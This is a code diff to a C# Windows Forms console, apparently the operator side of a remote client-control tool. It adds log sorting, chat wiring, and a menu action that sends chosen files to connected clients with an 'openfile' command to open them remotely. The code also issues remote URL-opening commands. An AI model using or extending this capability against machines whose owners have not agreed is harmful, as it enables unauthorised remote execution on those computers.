@@ -55,6 +55,10 @@ namespace Sweep.Forms
                 counter.Text = logsnum.ToString();
                 counter.Visible = logsnum > 0;
             };
+            logsview.BeforeSorting += (s, e) =>
+            {
+                e.SortOrder = SortOrder.Descending;
+            };
             usname.Text = usname.Text.Replace("%s", Global.Name);
             _server.ClientConnected += (s, clientId) => {
                 _ = _server.SendMessageToClient(clientId, "ack"); // shush warning
@@ -124,8 +128,8 @@ namespace Sweep.Forms
                 icon.Save(stream);
                 if (notifyIcon1 != null)
                 {
-                    notifyIcon1.BalloonTipTitle = "New Client Connected";
-                    notifyIcon1.BalloonTipText = clientId;
+                    notifyIcon1.BalloonTipTitle = clientId;
+                    notifyIcon1.BalloonTipText = "New client connected";
                     notifyIcon1.Icon = icon; // Use the created icon
                     notifyIcon1.ShowBalloonTip(2000);
                 }
@@ -189,17 +193,21 @@ namespace Sweep.Forms
 
                     chat = new Chat();
                     chat.username = input;
+                    chat.serverHost = _server;
+                    chat.connid = item.ID;
                     chat.Show();
 
                     chat.OnMessageSent += async (message, f) =>
                     {
-                        Console.WriteLine($"Sending message: {message} to {conn.Id}");
-                        await _server.SendMessageToClient(conn.Id, new JObject
-                        {
-                            ["command"] = "chatmsg",
-                            ["username"] = input,
-                            ["text"] = message
-                        }.ToString());
+                        if (!f) {
+                            Console.WriteLine($"Sending message: {message} to {conn.Id}");
+                            await _server.SendMessageToClient(conn.Id, new JObject
+                            {
+                                ["command"] = "chatmsg",
+                                ["username"] = input,
+                                ["text"] = message
+                            }.ToString());
+                        }
                     };
 
                     await _server.SendMessageToConnection(conn, new JObject
@@ -313,6 +321,45 @@ namespace Sweep.Forms
                         ["command"] = "url",
                         ["body"] = input,
                     }.ToString());
+                }
+            }
+        }
+
+        private async void fromPCToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+                ;
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    var input = DiskFileDialog.ShowDialog();
+
+                    if (input == DialogResult.OK) {
+                        var names = DiskFileDialog.FileNames;
+
+                        foreach (var name in names)
+                        {
+                            _dispatcher.AddLogToList(new JObject
+                            {
+                                ["message"] = $"Sending file {name} to {item.Username} ({item.ID})",
+                                ["type"] = "Info"
+                            });
+                                await _server.SendFileToClient(conn.Id, name, new JObject
+                                {
+                                    ["command"] = "openfile",
+                                    ["filename"] = Path.GetFileName(name)
+                                }.ToString());
+                            _dispatcher.AddLogToList(new JObject
+                            {
+                                ["message"] = $"File {name} successfully sent to {item.Username} ({item.ID})",
+                                ["type"] = "Info"
+                            });
+                        }
+                    }
                 }
             }
         }
